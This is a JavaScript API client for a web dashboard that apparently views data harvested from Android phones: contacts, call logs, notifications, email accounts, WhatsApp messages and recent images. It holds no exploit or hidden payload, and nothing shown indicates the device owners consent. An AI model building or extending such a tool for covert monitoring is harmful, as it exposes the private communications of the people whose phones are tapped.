import axios from 'axios';

const API_BASE_URL = process.env.NEXT_PUBLIC_API_BASE_URL || 'https://kotlin-node-harvesting.onrender.com';

const api = axios.create({
  baseURL: `${API_BASE_URL}/api`,
  timeout: 30000,
  headers: {
    'Content-Type': 'application/json',
  },
});

// Request interceptor
api.interceptors.request.use(
  (config) => {
    console.log(`Making ${config.method?.toUpperCase()} request to ${config.url}`);
    
    // Add authentication token if available
    const token = localStorage.getItem('token');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor
api.interceptors.response.use(
  (response) => {
    return response;
  },
  (error) => {
    console.error('API Error:', error.response?.data || error.message);
    
    // Handle authentication errors
    if (error.response?.status === 401 || error.response?.status === 403) {
      // Clear invalid tokens
      localStorage.removeItem('token');
      localStorage.removeItem('user');
      
      // Redirect to login if not already there
      if (typeof window !== 'undefined' && window.location.pathname !== '/login') {
        window.location.href = '/login';
      }
    }
    
    return Promise.reject(error);
  }
);

// Authentication API
export const authAPI = {
  register: (userData) => api.post('/user/register', userData),
  login: (credentials) => api.post('/user/login', credentials),
  logout: () => {
    localStorage.removeItem('token');
    localStorage.removeItem('user');
  },
  getToken: () => localStorage.getItem('token'),
  setToken: (token) => localStorage.setItem('token', token),
  getUser: () => {
    const user = localStorage.getItem('user');
    return user ? JSON.parse(user) : null;
  },
  setUser: (user) => localStorage.setItem('user', JSON.stringify(user)),
  isAuthenticated: () => !!localStorage.getItem('token')
};

// Health Check API
export const healthAPI = {
  check: () => api.get('/health'),
  getStats: () => api.get('/health')
};

// Device API - Updated to use working endpoints
export const deviceAPI = {
  getAll: (params = {}) => api.get('/devices', { params }),
  register: (deviceData) => api.post('/devices/register', deviceData),
  getSettings: (deviceId) => api.get(`/devices/${deviceId}/settings`),
  updateSettings: (deviceId, settings) => api.put(`/devices/${deviceId}/settings`, { settings }),
  updateStatus: (deviceId, isActive) => api.patch(`/devices/${deviceId}/status`, { isActive }),
  delete: (deviceId) => api.delete(`/devices/${deviceId}`),
  updateSync: (deviceId, dataType) => api.post(`/devices/${deviceId}/sync/${dataType}`),
  // New endpoints from latest backend
  syncData: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data }),
  getSyncSettings: (deviceId) => api.get(`/test/devices/${deviceId}/sync-settings`),
  getLastSync: (deviceId, dataType) => api.get(`/test/devices/${deviceId}/last-sync/${dataType}`),
  getDeviceData: (deviceId, dataType) => api.get(`/test/devices/${deviceId}/${dataType}`),
  uploadLast5Images: (deviceId, data) => api.post(`/test/devices/${deviceId}/upload-last-5-images`, data),
  testSync: (deviceId, data) => api.post(`/test/devices/${deviceId}/sync`, data)
};

// Data API - New unified endpoint
export const dataAPI = {
  getAll: (dataType) => api.get(`/data/${dataType}`),
  getByDevice: (deviceId, dataType) => api.get(`/client/dashboard/devices/${deviceId}/${dataType}`),
  sync: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data })
};

// Contacts API - Updated to use direct routes with server-side filtering
export const contactsAPI = {
  sync: (deviceId, contacts) => api.post(`/devices/${deviceId}/sync`, { dataType: 'contacts', data: contacts }),
  getAll: (deviceId, params = {}) => api.get(`/contacts/${deviceId}`, { params }),
  getById: (deviceId, contactId) => api.get(`/contacts/${deviceId}/${contactId}`),
  delete: (deviceId, contactId) => api.delete(`/contacts/${deviceId}/${contactId}`)
};

// Call Logs API - Updated to use direct routes with server-side filtering
export const callLogsAPI = {
  sync: (deviceId, callLogs) => api.post(`/devices/${deviceId}/sync`, { dataType: 'callLogs', data: callLogs }),
  getAll: (deviceId, params = {}) => api.get(`/calllogs/${deviceId}`, { params }),
  getStats: (deviceId) => api.get(`/calllogs/${deviceId}/stats`),
  delete: (deviceId, callId) => api.delete(`/calllogs/${deviceId}/${callId}`)
};

// Notifications API - Updated to use direct routes with server-side filtering
export const notificationsAPI = {
  sync: (deviceId, notifications) => api.post(`/devices/${deviceId}/sync`, { dataType: 'notifications', data: notifications }),
  getAll: (deviceId, params = {}) => api.get(`/notifications/${deviceId}`, { params }),
  getStats: (deviceId) => api.get(`/notifications/${deviceId}/stats`),
  delete: (deviceId, notificationId) => api.delete(`/notifications/${deviceId}/${notificationId}`)
};

// Messages API - SMS disabled due to Android restrictions
export const messagesAPI = {
  sync: (deviceId, messages) => {
    console.warn('SMS sync is disabled due to Android security restrictions');
    return Promise.resolve({ data: { success: false, message: 'SMS sync disabled' } });
  },
  getAll: (deviceId, params = {}) => {
    console.warn('SMS data access is disabled due to Android security restrictions');
    return Promise.resolve({ data: { data: [], total: 0, message: 'SMS access disabled' } });
  },
  getStats: (deviceId) => {
    console.warn('SMS stats are disabled due to Android security restrictions');
    return Promise.resolve({ data: { total: 0, message: 'SMS stats disabled' } });
  },
  delete: (deviceId, messageId, type) => {
    console.warn('SMS deletion is disabled due to Android security restrictions');
    return Promise.resolve({ data: { success: false, message: 'SMS deletion disabled' } });
  }
};

// Email Accounts API - Updated to use direct routes with server-side filtering
export const emailAccountsAPI = {
  sync: (deviceId, emailAccounts) => api.post(`/devices/${deviceId}/sync`, { dataType: 'emailAccounts', data: emailAccounts }),
  getAll: (deviceId, params = {}) => api.get(`/emailaccounts/${deviceId}`, { params }),
  getByAddress: (deviceId, emailAddress) => api.get(`/emailaccounts/${deviceId}/${encodeURIComponent(emailAddress)}`),
  updateStatus: (deviceId, emailAddress, isActive) => api.patch(`/emailaccounts/${deviceId}/${encodeURIComponent(emailAddress)}/status`, { isActive }),
  delete: (deviceId, emailAddress) => api.delete(`/emailaccounts/${deviceId}/${encodeURIComponent(emailAddress)}`)
};

// WhatsApp API - Updated to use client routes
export const whatsappAPI = {
  sync: (deviceId, messages) => api.post(`/devices/${deviceId}/sync`, { dataType: 'whatsapp', data: messages }),
  getAll: (deviceId, params = {}) => api.get(`/test/devices/${deviceId}/whatsapp`, { params }),
  getStats: (deviceId) => api.get(`/test/devices/${deviceId}/whatsapp/stats`),
  delete: (deviceId, messageId) => api.delete(`/test/devices/${deviceId}/whatsapp/${messageId}`)
};

// Admin API - Updated to use working endpoints
export const adminAPI = {
  fixIndexes: () => api.post('/fix-indexes'),
  getGlobalStats: () => api.get('/health'),
  getDataByType: (dataType) => api.get(`/data/${dataType}`)
};

// Sync API - Updated to use working endpoints
export const syncAPI = {
  syncData: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data }),
  getSyncedData: (deviceId, dataType) => api.get(`/test/devices/${deviceId}/${dataType}`),
  getSyncStats: (deviceId) => api.get(`/test/devices/${deviceId}/sync-settings`),
  getLastSync: (deviceId, dataType) => api.get(`/test/devices/${deviceId}/last-sync/${dataType}`)
};

export default api;
